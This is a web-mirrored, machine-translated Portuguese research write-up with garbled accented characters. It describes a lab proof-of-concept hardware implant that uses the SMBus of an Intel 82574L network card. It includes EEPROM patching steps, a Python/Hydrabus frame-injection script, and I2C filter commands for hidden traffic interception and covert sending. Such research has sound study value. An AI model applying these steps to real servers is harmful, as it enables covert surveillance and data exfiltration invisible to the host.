<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ü¶è üí∂ üë©üèæ‚Äçüè≠ Fazendo seu pr√≥prio implante para eletr√¥nicos üèÇüèª ü•• üï£</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="A hist√≥ria da Bloomberg de que alguns implantes foram supostamente instalados nas placas-m√£e [os chineses usavam um microchip para controlar os comput...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Fazendo seu pr√≥prio implante para eletr√¥nicos</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/429190/"><img src="https://habrastorage.org/webt/0b/ft/fa/0bftfawizhuqj5ah4gu_9z1tzak.png"><br><br>  A hist√≥ria da <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Bloomberg de</a> que alguns implantes foram supostamente instalados nas placas-m√£e [os <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">chineses usavam um microchip para controlar os computadores americanos</a> ] n√£o passou despercebida.  Depois disso, muitas pessoas compartilharam id√©ias sobre a possibilidade de criar esses implantes (tamanho estimado, capacidade ou m√©todo de detec√ß√£o). <br><br>  Alguns dias depois, a revista <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Bloomberg</a> publicou um artigo com evid√™ncias adicionais.  Aqui est√° o que especificamente despertou nosso interesse: <br><blockquote>  O servidor jur√≠dico enviou mensagens de uma maneira, o implante da outra, mas parecia que todo o tr√°fego vinha de um servidor confi√°vel. </blockquote><br><a name="habracut"></a><br>  Existem maneiras de interagir com a placa de rede diretamente da placa-m√£e.  V√°rias pessoas indicaram que voc√™ pode jogar com o BMC (Baseboard Management Controller - um componente que permite acesso ao servidor al√©m do canal principal), o que permitir√° ao implante controlar o BMC e obter acesso √† placa de rede.  Mas como isso funciona na pr√°tica?  Vamos ver se podemos reproduzir isso. <br><br><h2>  Posi√ß√£o inicial </h2><br>  Vejamos as poss√≠veis interfaces entre a NIC (placa de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">rede</a> ) e o BMC.  Um dos principais protocolos para trabalhar em um canal dedicado √© a interface inteligente de gerenciamento da plataforma IPMI. <br><br><h3>  IPMI </h3><br>  A Wikipedia diz que o IPMI √© ‚Äúuma interface inteligente de gerenciamento de plataforma projetada para monitorar e gerenciar autonomamente os recursos criados diretamente no hardware e firmware das plataformas de servidor.  Os principais recursos do IPMI s√£o monitoramento, restaura√ß√£o de fun√ß√µes de gerenciamento, registro e invent√°rio, dispon√≠veis independentemente do processador, BIOS e sistema operacional.  Os recursos de gerenciamento de plataforma podem estar dispon√≠veis mesmo quando o sistema est√° desligado. ‚Äù  Muito parecido com o que precisamos. <br><br>  O fluxograma a seguir mostra um poss√≠vel caminho de implementa√ß√£o do projeto: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/33c/3e3/2f6/33c3e32f69cf311114455fe1fb98d5a1.png"><br><br>  O IPMI realmente define dois canais de banda lateral para a NIC: SMBus e NC-SI.  O NC-SI √© uma substitui√ß√£o SMBus de ponta que suporta velocidades aprimoradas de transfer√™ncia de dados e outros novos recursos.  O problema √© que ela precisa de mais sinais (cerca de 10) e √© muito mais dif√≠cil intervir em seu trabalho quando estamos trabalhando com um implante.  Ent√£o, por enquanto, vamos nos concentrar no SMBus. <br><br><h3>  SMBus </h3><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">O SMBus</a> (System Management Bus) √© um protocolo de comunica√ß√£o serial para dispositivos de energia.  Barramento de dois fios simples de um lado, fornecendo comunica√ß√µes simples.  Geralmente usado em computadores para conectar a placa-m√£e a uma fonte de energia e enviar / ativar instru√ß√µes.  Baseado no barramento <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">I <sup>2</sup> C</a> , comumente usado em microcontroladores.  A interface precisa apenas de dois sinais (frequ√™ncia do rel√≥gio e dados), e o terceiro sinal √© uma interrup√ß√£o.  Perfeito para o protocolo de jogos de implantes. <br><br><h2>  Primeiro contato </h2><br>  Voc√™ precisa ser inteligente, sem ter acesso √† placa-m√£e com o BMC.  Estudando as caracter√≠sticas t√©cnicas das placas-m√£e de servidor, descobrimos que algumas delas usam o chip <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Intel 82574L</a> .  De acordo com a <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">documenta√ß√£o</a> , ele fornece a "interface avan√ßada de passagem SMBus" - exatamente o que voc√™ precisa.  E o melhor de tudo, ele vem no formato de cart√£o PCI-E. <br><br><h3>  Acesso SMBus </h3><br>  Fomos √† loja e agora temos placas <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Intel EXPI9301CTBLK</a> com o chip 82574L.  O que agora <br><br>  A documenta√ß√£o pode rastrear SMB_DAT e SMB_ALRT_N.  Felizmente, todos estavam dispon√≠veis nos blocos de contato.  Tudo parece ser bem f√°cil. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e71/6a5/467/e716a54673d59b3aec0c9e34765ef734.jpg"><br>  <i>NIC PCB.</i>  <i>Superior esquerdo - EEPROM, superior direito - conector para SMBus [ALRT | CLK | DAT].</i>  <i>Observe que o R39 e o R40 est√£o fechados, o que pro√≠be o acesso ao SMBus para o conector PCIe.</i> <br><br>  Conectamos a <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">sonda I <sup>2</sup> C</a> e examinamos o SMBus, mas n√£o contamos nada de √∫til.  A documenta√ß√£o diz que o SMBus √© ativado apenas quando um registro de bits espec√≠fico √© definido.  Este valor √© carregado a partir da EEPROM.  √â hora de ir mais fundo. <br><br><h3>  Ativar acesso ao SMBus </h3><br>  A documenta√ß√£o nos ajuda novamente.  O acesso ao SMBus √© determinado pelo valor do registro carregado na NIC EEPROM.  Felizmente, a EEPROM pode ser lida com flashrom.  Ao despejar o conte√∫do da EEPROM, podemos analisar e alterar os valores: <br><br> <code>&gt; ./flashrom -p buspirate_spi:dev=/dev/hydrabus --read /tmp/flash.dump <br> flashrom p1.0-87-g9891b75-dirty on Linux 4.18.12-arch1-1-ARCH (x86_64) <br> flashrom is free software, get the source code at https://flashrom.org <br> <br> Using clock_gettime for delay loops (clk_id: 1, resolution: 1ns). <br> Found Winbond flash chip "W25X40" (512 kB, SPI) on buspirate_spi. <br> Reading flash... done.</code> <br> <br>  A julgar pelo mapa NVM (cap√≠tulo 6.1 da documenta√ß√£o), fica claro que precisamos alterar dois valores: <br><br><ul><li>  Palavra de controle de inicializa√ß√£o 2 [MNGM] (folha de dados cap√≠tulo 6.1.1.6) </li><li>  Compatibilidade [ASF SMBus Connected] (cap√≠tulo 6.1.2.1.1 da folha de dados) </li><li>  Compatibilidade [SMBus Connected] (cap√≠tulo 6.1.2.1.1 da folha de dados) </li></ul><br>  √â necess√°rio considerar apenas que na EEPROM os dados s√£o armazenados no formato little endian. <br><br>  Depois disso, ainda precisamos lidar com o valor da soma de verifica√ß√£o.  O cap√≠tulo 6.1.2.11 afirma que a soma de todas as palavras no intervalo [0x00-0x40] deve ser 0xBABA.  Um pouco de Python nos ajudar√° a calcular a soma de verifica√ß√£o correta: <br><br> <code>import struct <br> data = open('/tmp/flash.mod', 'rb').read() <br> tot = 0 <br> for i in range(0x3f): <br> tot = (tot + struct.unpack('&lt;H',data[2*i:(2*i)+2])[0]) &amp; 0xffff <br> <br> print("Checksum word must be : " + hex(0xbaba-tot)) <br> #Checksum word must be : 0x9efb</code> <br> <br>  E, finalmente, todas as nossas altera√ß√µes na EEPROM: <br><br> <code>&lt; 00000000: 6805 ca89 b22e 2004 46f7 8010 ffff ffff h..... .F....... <br> &gt; 00000000: 6805 ca89 b22e 3014 46f7 8010 ffff ffff h.....0.F....... <br> &lt; 00000010: 69e4 0881 6b02 1fa0 8680 d310 ffff 5a9c i...k.........Z. <br> &gt; 00000010: 69e4 0881 6b02 1fa0 8680 d310 ffff 5adc i...k.........Z. <br> <br> &lt; 00000070: ffff ffff ffff ffff ffff 3001 ffff 0bef ..........0..... <br> &gt; 00000070: ffff ffff ffff ffff ffff 3001 ffff fb9e ..........0.....</code> <br> <br>  Depois de fazer altera√ß√µes e piscar a EEPROM, conectamos uma sonda I <sup>2</sup> C e: <br><br> <code>i2c1&gt; scan <br> Device found at address 0x49 <br> i2c1&gt;</code> <br> <br>  O endere√ßo I <sup>2</sup> C √© codificado em sete bits, o endere√ßo que precisamos √© obtido como 0x49 &lt;&lt; 1 = 0x92. <br><br>  Agora, temos um diagrama de trabalho para o nosso implante.  Podemos enviar comandos para a NIC: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/13c/bfc/f14/13cbfcf14267b6055c8dc5760b59e2fd.jpg"><br><br><h2>  Recebendo informa√ß√µes </h2><br>  Como voc√™ deve ter adivinhado, continuamos lendo a documenta√ß√£o e enviando comandos especialmente preparados para a NIC para verificar se tudo estava funcionando conforme o esperado. <br><br>  A documenta√ß√£o descreve tudo o que voc√™ precisa saber sobre o formato da transa√ß√£o no cap√≠tulo 8.4.4.  A √∫nica diferen√ßa √© que n√£o precisamos calcular o PEC (soma de verifica√ß√£o para SMBus, calculada para cada pacote).  Por exemplo, podemos enviar o comando CMD para o endere√ßo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" class="user_link">SLAVE</a> usando a seguinte sequ√™ncia: <br><br> <code>[START] [@SLAVE] [CMD] ( [START] [@SLAVE] [READ_DATA] ) [STOP]</code> <br> <br>  [START] e [STOP] s√£o as condi√ß√µes de START e STOP definidas por I <sup>2</sup> C. <br><br>  Por exemplo, o comando para ler o endere√ßo MAC (descrito no cap√≠tulo 8.8.2.3) ser√° 0xD4.  Enviamos o comando para SMBus no modo I <sup>2</sup> C: <br><br> <code>[START] [0x92] [0xD4] [START] [0x92] [read 8 bytes] [STOP]</code> <br> <br>  Quando transferido para as equipes Hydrabus, ser√°: <br><br> <code>i2c1&gt; [ 0x92 0xd4 [ 0x92 hd:2 hd:6 ] <br> I2C START <br> WRITE: 0x92 ACK 0xD4 ACK &lt;== [NIC address] [command] <br> I2C START &lt;== Switch state <br> WRITE: 0x92 ACK &lt;== [NIC address] <br> 07 D4 | .. &lt;== Read [length] [header] <br> 68 05 CA 89 B2 2E | h..... &lt;== Read MAC address bytes <br> NACK <br> I2C STOP</code> <br> <br>  E sim, obtemos o nosso endere√ßo MAC! <br><br><h2>  Fazendo um implante </h2><br>  Agora, sabendo como voc√™ pode se comunicar com a NIC, vamos ver como voc√™ pode usar esse canal para roubar o tr√°fego da rede e enviar dados pela rede.  O cap√≠tulo 8 da documenta√ß√£o descreve tudo o que voc√™ precisa para fazer isso. <br><br><h3>  Enviando pacotes </h3><br>  Descrito nos cap√≠tulos 8.6 e 8.8.1.  Podemos simplesmente criar um quadro Ethernet usando comandos.  Aqui est√° um exemplo de script para <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Hydrabus</a> ou <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Bus Pirate</a> enviar um pacote: <br><br> <code>import serial <br> import struct <br> from scapy.all import * <br> <br> ser = serial.Serial('/dev/ttyACM0',115200) <br> <br> def send_frame(pkt): <br> # Define the frame size <br> pktlen = struct.pack("B", len(pkt)) <br> <br> # Define the data length to be sent <br> fulllen = struct.pack("&gt;h", len(pkt)+3) <br> <br> # I2C write-then-read. Send frame + SMBus header, receive 0 <br> ser.write('\x08'+fulllen+'\x00\x00') <br> ser.write("\x92\xc4"+pktlen+pkt) <br> <br> # If packet has been sent successfully <br> if ser.read(1) == '\x01': <br> print "Send OK" <br> else: <br> print "Error sending" <br> ser.write('\x00') <br> ser.write('\x00') <br> ser.write('\x0F\n') <br> quit() <br> <br> # Open Hydrabus in binary mode <br> for i in xrange(20): <br> ser.write("\x00") <br> if "BBIO1" not in ser.read(5): <br> print "Could not get into binary mode" <br> quit() <br> <br> # Switch to I2C mode <br> ser.write('\x02') <br> if "I2C1" not in ser.read(4): <br> print "Cannot set I2C mode" <br> quit() <br> <br> #Create the frame to send <br> p = Ether(src="11:22:33:44:55:66", dst="ff:ff:ff:ff:ff:ff") / IP(src="10.31.32.82", dst="10.31.32.80")/ICMP() <br> <br> #Send the frame <br> send_frame(str(p)) <br> <br> # Return to main binary mode <br> ser.write('\x00') <br> #reset to console mode <br> ser.write('\x0F\n')</code> <br> <br>  Depois de executar o script, voc√™ pode ver o pacote vindo da m√°quina com o implante e, mais interessante, o pr√≥prio servidor n√£o v√™ esse pacote: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/ea1/947/4f2/ea19474f2a801afddb732624fa1f3d40.png"><br>  <i>Tcpdump da m√°quina do atacante √† esquerda, servidor √† direita</i> <br><br><h3>  Pacotes de leitura </h3><br><h4>  Filtragem </h4><br>  Para descobrir quais quadros devem ir para o SMBus, a NIC usa filtros de controle.  Eles mapeiam o tr√°fego da rede e o redirecionam para o PCIe, ou para o SMBus, ou para l√° e para l√°.  Do nosso ponto de vista, isso nos d√° uma grande flexibilidade: <br><br><ul><li>  Voc√™ pode rastrear o tr√°fego definindo um filtro que o varrer√° e o redirecionar√° para PCIe e SMBus. </li><li>  Voc√™ pode fazer com que o tr√°fego desapare√ßa direcionando-o apenas para SMBus. </li><li>  Voc√™ pode criar um canal oculto que n√£o ficar√° vis√≠vel para o servidor com o implante. </li></ul><br>  O mais interessante √© que o filtro pode ser configurado para rastrear v√°rios elementos do quadro: <br><br><ul><li>  Porta UDP / TCP </li><li>  VLAN </li><li>  IPv4 - IPv6 </li><li>  Endere√ßo MAC </li><li>  ... </li></ul><br>  (Para uma lista completa, consulte o cap√≠tulo 8.4.2.1) <br><br>  Sete filtros MDEF independentes [0: 6] est√£o dispon√≠veis e cada um deles pode ser configurado para redirecionar o tr√°fego correspondente ao PCIe sobre SMBus usando o registro MANC2H (para obter mais detalhes, consulte o cap√≠tulo 8.4.3). <br><br><h4>  Implementa√ß√£o </h4><br>  Foi muito dif√≠cil configurar tudo corretamente. Tentamos v√°rias combina√ß√µes diferentes para fazer o filtro funcionar.  Felizmente, a <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">nota</a> sobre <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">o aplicativo da</a> Intel nos deu mais detalhes sobre como executar filtros da maneira que precisamos. <br><br>  Usando nosso probe I <sup>2</sup> C, podemos configurar tudo isso com quatro comandos: <br><br> <code>//    <br> [ 0x92 0xca 0x01 0x40 ] <br> //  MDEF[0]   ,   UDP/664  UDP/623 <br> [ 0x92 0xcc 0x06 0x61 0x00 0x00 0x00 0x0c 0x00 ] <br> //  MANC2H      <br> [ 0x92 0xcc 0x05 0x0a 0x00 0x00 0x00 0x00 ] <br> //   (SMBus alerting, status reporting / Enable) <br> [ 0x92 0xca 0x01 0x45 ]</code> <br> <br>  Conforme descrito no cap√≠tulo 8.8.1.3, √© necess√°rio definir v√°rios bits para permitir a recep√ß√£o de dados e enviar quadros de volta ao nosso implante.  Escolhemos o alerta SMBus porque outros modelos permitem que a placa de rede fa√ßa solicita√ß√µes ass√≠ncronas ao SMBus (para detalhes, consulte o cap√≠tulo 8.4.5). <br><br><h4>  Quadros de leitura </h4><br>  Como usamos o m√©todo de alerta SMBus, esper√°vamos que o sinal SMB_ALRT_N se desligasse antes de enviar o comando Receive TCO Packet.  Se esper√°ssemos muito tempo, o pacote seria rejeitado pela NIC. <br><br>  Para ilustrar apenas o diagrama, enviaremos quadros periodicamente e enviaremos comandos de leitura - apenas para confirmar que esse princ√≠pio funciona.  O esquema √© assim: <br><br><ul><li>  Um servidor com um implante possui filtros que monitoram o tr√°fego com o UDP / 623 (cap√≠tulo 3.6.1.2). </li><li>  O implante √© simulado usando Hydrabus. </li><li>  Outro servidor envia pacotes que se enquadram no filtro usando o script Scapy: </li></ul><br> <code>from scapy.all import * <br> p=Ether()/IP(dst="10.31.32.81")/UDP(dport=0x26f)/"MALICIOUS PAYLOAD" <br> while(1):sendp(p)</code> <br> <br>  Acontece algo interessante: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e03/407/a68/e03407a6872fbeda15ad73fa32c87257.png"><br><br>  √Ä esquerda, o SMBus l√™ o quadro; os dados do quadro s√£o mostrados abaixo.  √Ä direita, o tcpdump, executando em um servidor com um implante, n√£o mostra os quadros recebidos. <br><br><h4>  Frame Relay </h4><br>  Alterando o registro do MANC2H, √© poss√≠vel garantir que o tr√°fego enviado ao SMBus e ao PCIe seja exibido corretamente no servidor.  Por exemplo, vamos criar um filtro de intercepta√ß√£o que responda ao tr√°fego UDP / 161 (SNMP) e o envie para SMBus e PCIe: <br><br> <code>//    <br> [ 0x92 0xca 0x01 0x40 ] <br> //  - 0   161 (0xa1) <br> [ 0x92 0xcc 0x04 0x63 0x00 0x00 0xa1 ] <br> //  MDEF[0]   ,   - 0 <br> [ 0x92 0xcc 0x06 0x61 0x00 0x00 0x00 0x10 0x00 ] <br> //  MANC2H     MDEF[0]  PCIe <br> [ 0x92 0xcc 0x05 0x0a 0x00 0x00 0x00 0x00 ] <br> //   (SMBus alerting, status reporting / Enable) <br> [ 0x92 0xca 0x01 0x45 ]</code> <br> <br>  Ao ativar os filtros, podemos enviar uma solicita√ß√£o SNMP ao servidor com o implante e ver o pacote que interceptou o implante.  Ao mesmo tempo, o servidor responde √† solicita√ß√£o - o que significa que o pacote foi redirecionado corretamente para SMBus e PCIe: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e32/d3b/281/e32d3b281a556bd1bcdebe86498a2dc1.png"><br>  <i>Acima est√° uma solicita√ß√£o SNMP interceptada do implante.</i>  <i>Abaixo - a solicita√ß√£o SNMP chegou ao servidor.</i> <br><br><h2>  Conclus√µes </h2><br>  Descrevemos um m√©todo poss√≠vel para a introdu√ß√£o de um microcontrolador pequeno e barato como implante no n√≠vel da NIC.  Esse implante precisa de pelo menos quatro contatos (Vcc, GND, CLK, DAT) e pode controlar a placa do servidor.  Entre suas caracter√≠sticas: <br><br><ul><li>  Escutando o tr√°fego de rede recebido no servidor. </li><li>  Recebendo comandos da rede sem o conhecimento do servidor. </li><li>  Transmiss√£o de dados pela rede sem o conhecimento do servidor. </li></ul><br>  Em nosso exemplo, por simplicidade, o Hydrabus foi usado como interface para I <sup>2</sup> C / SMBus, mas isso pode ser feito com a mesma facilidade em um pequeno microcontrolador, por exemplo, ATtiny85 (√© do tamanho de uma EEPROM para NIC). <br><br>  No entanto, na vida real, o acesso a esse implante seria apenas para o SMBus.  Dependendo do esquema da placa-m√£e, este dispositivo pode ser o √∫nico dispon√≠vel e, portanto, a intera√ß√£o com o sistema operacional do servidor ser√° imposs√≠vel.  No caso em que √© necess√°rio controle total sobre o sistema operacional, √© melhor alterar o c√≥digo BMC, pois ele j√° tem acesso a todos os barramentos interessantes e n√£o deixa rastros vis√≠veis na placa-m√£e. <br><br>  Outra desvantagem desse implante √© que ele pode transmitir dados em velocidades da ordem de 100 Kb / s, o que n√£o √© suficiente para um estudo completo do tr√°fego.  Al√©m disso, o implante √© capaz de interceptar apenas o tr√°fego proveniente da rede.  Como resultado, essa solu√ß√£o parece ineficaz em compara√ß√£o com os esfor√ßos necess√°rios para sua implementa√ß√£o no equipamento de destino. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt429190/">https://habr.com/ru/post/pt429190/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt429180/index.html">Ir para Ir para</a></li>
<li><a href="../pt429182/index.html">A intelig√™ncia artificial se deparou com uma barreira de entendimento</a></li>
<li><a href="../pt429184/index.html">A m√≠dia on-line previsivelmente rompe a cadeia sobre estudiosos de Oumuamua e Harvard</a></li>
<li><a href="../pt429186/index.html">@Pythonetc outubro de 2018</a></li>
<li><a href="../pt429188/index.html">Vis√£o geral do PICASO 3D Designer XL</a></li>
<li><a href="../pt429192/index.html">Esses novos truques ainda s√£o capazes de superar os v√≠deos do Deepfake.</a></li>
<li><a href="../pt429194/index.html">7 bibliotecas para desenvolvimento Android no Kotlin</a></li>
<li><a href="../pt429196/index.html">Explora√ß√£o m√≥vel em tempo de execu√ß√£o do iOS com Objection ou Hack nosso pr√≥prio aplicativo</a></li>
<li><a href="../pt429198/index.html">O Kernel-Bridge Framework: Ponte no Ring0</a></li>
<li><a href="../pt429202/index.html">Cursos caros: vale a pena?</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>